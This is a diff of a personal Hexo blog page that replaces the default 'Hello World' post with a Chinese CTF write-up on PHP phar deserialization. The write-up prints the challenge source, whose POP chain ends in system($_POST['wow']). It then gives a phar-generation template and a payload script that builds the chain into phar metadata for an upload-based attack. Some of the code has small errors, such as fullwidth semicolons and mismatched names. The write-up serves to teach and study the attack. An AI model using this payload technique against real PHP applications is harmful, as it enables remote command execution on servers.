@@ -4,9 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Hello World, ctf*web*student">
-    <meta name="description" content="YUNiversity测试
-Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems ">
+    <meta name="keywords" content="ctf*web*student">
+    <meta name="description" content="
+title： php序列化与反序列化进阶–phar反序列化top： truecategories： 知识归纳tags：- 知识
+
+在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下
+">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +21,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Hello World | 青云阁</title>
+    <title>青云阁</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -384,12 +387,12 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Hello World</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -425,28 +428,28 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-03-15
+                    2025-04-16
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-03-16
+                    2025-04-16
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    76
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -466,20 +469,38 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>YUNiversity测试</p>
-<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure>
+                <hr>
+<p>title： php序列化与反序列化进阶–phar反序列化<br>top： true<br>categories： 知识归纳<br>tags：- 知识</p>
+<hr>
+<p>在打tgctf的时候碰到了文件上传+phar反序列化组合拳，之前有所了解但并没有掌握，趁复现好好的学习一下</p>
+<p>先放上tg的源码</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">function best64_decode($<span class="built_in">str</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> base64_encode(md5(base64_encode(md5($<span class="built_in">str</span>))));</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">yesterday</span> {</span><br><span class="line">    public $learn;</span><br><span class="line">    public $study=<span class="string">"study"</span>;</span><br><span class="line">    public $<span class="keyword">try</span>;</span><br><span class="line">    public function __construct()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;learn = <span class="string">"learn&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    public function __destruct()</span><br><span class="line">    {</span><br><span class="line">        echo <span class="string">"You studied hard yesterday.&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;study-&gt;hard();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">today</span> {</span><br><span class="line">    public $doing;</span><br><span class="line">    public $did;</span><br><span class="line">    public $done;</span><br><span class="line">    public function __construct(){</span><br><span class="line">        $this-&gt;did = <span class="string">"What you did makes you outstanding.&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    public function __call($arg1, $arg2)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;done = <span class="string">"And what you've done has given you a choice.&lt;br&gt;"</span>;</span><br><span class="line">        echo $this-&gt;done;</span><br><span class="line">        <span class="keyword">if</span>(md5(md5($this-&gt;doing))==<span class="number">666</span>){</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;doing();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">return</span> $this-&gt;doing-&gt;better;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tommoraw</span> {</span><br><span class="line">    public $good;</span><br><span class="line">    public $bad;</span><br><span class="line">    public $soso;</span><br><span class="line">    public function __invoke(){</span><br><span class="line">        $this-&gt;good=<span class="string">"You'll be good tommoraw!&lt;br&gt;"</span>;</span><br><span class="line">        echo $this-&gt;good;</span><br><span class="line">    }</span><br><span class="line">    public function __get($arg1){</span><br><span class="line">        $this-&gt;bad=<span class="string">"You'll be bad tommoraw!&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">future</span>{</span><br><span class="line">    private $impossible=<span class="string">"How can you get here?&lt;br&gt;"</span>;</span><br><span class="line">    private $out;</span><br><span class="line">    private $no;</span><br><span class="line">    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;</span><br><span class="line"></span><br><span class="line">    public function __<span class="built_in">set</span>($arg1, $arg2) {</span><br><span class="line">        <span class="keyword">if</span> ($this-&gt;out-&gt;useful7) {</span><br><span class="line">            echo <span class="string">"Seven is my lucky number&lt;br&gt;"</span>;</span><br><span class="line">            system(<span class="string">'whoami'</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    public function __toString(){</span><br><span class="line">        echo <span class="string">"This is your future.&lt;br&gt;"</span>;</span><br><span class="line">        system($_POST[<span class="string">"wow"</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"win"</span>;</span><br><span class="line">    }</span><br><span class="line">    public function __destruct(){</span><br><span class="line">        $this-&gt;no = <span class="string">"no"</span>;</span><br><span class="line">        <span class="keyword">return</span> $this-&gt;no;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (file_exists($_GET[<span class="string">'filename'</span>])){</span><br><span class="line">    echo <span class="string">"Focus on the previous step!&lt;br&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span>{</span><br><span class="line">    $data=substr($_GET[<span class="string">'filename'</span>],<span class="number">0</span>,-<span class="number">4</span>);</span><br><span class="line">    unserialize(best64($data));</span><br><span class="line">}</span><br><span class="line">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure>
+<p>比较明显的特征就是无法正常进行反序列化(不可逆的md5加密)且存在文件上传的途径（这里没有放文件上传的源码）</p>
+<p>我们先引入phar反序列化的概念</p>
+<blockquote>
+<p><strong>PHAR反序列化漏洞</strong>是与PHP中的对象反序列化相关的一种安全漏洞，特别是在处理PHAR文件时可能被利用。</p>
+<p>概念解释：</p>
+<pre><code>PHAR文件：
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure>
+PHAR 是一种类似于ZIP或TAR的归档格式，但它专门为PHP应用程序设计。一个PHAR文件可以包含PHP文件、图片、配置等内容，可以直接在PHP环境中执行。
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure>
+PHAR反序列化漏洞： PHAR文件可以存储序列化的PHP对象。在某些情况下，PHP内置函数如file_exists()、is_file()等文件操作函数可以被用于处理包含PHAR存档的路径。例如，如果一个应用程序在未预期的情况下处理到PHAR文件并通过反序列化机制读取该文件，攻击者可以构造恶意的PHAR文件，使PHP反序列化攻击得以执行。
+</code></pre>
+</blockquote>
+<p>对于晦涩的概念我向来无感，这里直接给上一个phar包(和jar包差不多)</p>
+<p>比较重要的就是你要新建了一个类，还有一个就是setMetadata，这是核心</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Destiny</span></span>{</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$he_say</span>;</span><br><span class="line">}</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="attr">filename</span>:<span class="string">'test-phar'</span>);<span class="comment">//删除之前的test-phar文件（如果存在)</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(filename:<span class="string">'test.phar'</span>);<span class="comment">//创建一个Phar对象，文件名必须以phar为后缀，生成后可以随意修改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>()；<span class="comment">//开始写入文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">// 写入 stub</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Dest1ny</span>();<span class="comment">//这个是链子也可以放在 @前面</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>)；<span class="comment">//写入元数据</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="attr">localName</span>:<span class="string">"test.txt"</span>,<span class="attr">contents</span>:<span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering（）；<span class="comment">//停止写入文件并完成压缩</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>看我的注释就很好明白，把链子当作元数据生成phar压缩文件传入后配合phar来进行反序列化（大概的流程就是这样）</p>
+<p>那么tg的payload也就很好写出，只需要改一下链子</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>{</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>{</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">}</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">future</span></span>{</span><br><span class="line">     </span><br><span class="line">}</span><br><span class="line"><span class="variable">$y</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yesterday</span>();</span><br><span class="line"><span class="variable">$y</span>-&gt; study = <span class="keyword">new</span> <span class="title function_ invoke__">today</span>();</span><br><span class="line"><span class="variable">$y</span>-&gt;study-&gt;doing=<span class="keyword">new</span> <span class="title function_ invoke__">future</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">"phar.phar"</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar，生成后可以随意修改</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$y</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"> <span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后直接运行，这边报错的话，需要改一下php.ini里的readonly，把ON改成OFF  </p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1744786978281-9ff062b9-8007-47ff-967e-18786378edc0.png"></p>
+<p>第一个红框是文件头，第二个红框是setMetadata，而且如果php文件里有读取文件的函数，他一定会把setMetadata里的内容反序列化。</p>
+<p><img src="/img/loading.gif" data-original="https://cdn.nlark.com/yuque/0/2025/png/52815563/1744787022620-fefa5e19-e924-409f-8ec1-c46ebae47a67.png"></p>
+<p>更改后缀他的文件头是不变的，所以可以修改成任意的后缀（生成之后）</p>
 
                 
             </div>
@@ -506,7 +527,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2025/03/15/hello-world/">http://example.com/2025/03/15/hello-world/</a>
+                    <a href="http://example.com/2025/04/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6--phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2025/04/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6--phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -587,54 +608,18 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2025/03/16/%E6%B5%8B%E8%AF%95/">
+                <a href="/2025/04/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6--phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
                         
-                        <img src="/img/loading.gif" data-original="/medias/featureimages/2.jpg" class="responsive-img" alt="测试">
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/0.jpg" class="responsive-img" alt="">
                         
-                        <span class="card-title">测试</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-03-16
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            YUNiversity
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/03/15/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/img/loading.gif" data-original="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title"></span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -645,7 +630,45 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            YUNiversity
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/04/16/php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6--phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/0.jpg" class="responsive-img" alt="">
+                        
+                        <span class="card-title"></span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-16
                             </span>
                         <span class="publish-author">
                             
@@ -847,7 +870,7 @@ Welcome to Hexo! This is your very first post. Check documentation for more info
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">79</span>
+                        class="white-color">1.1k</span>
             
             
             
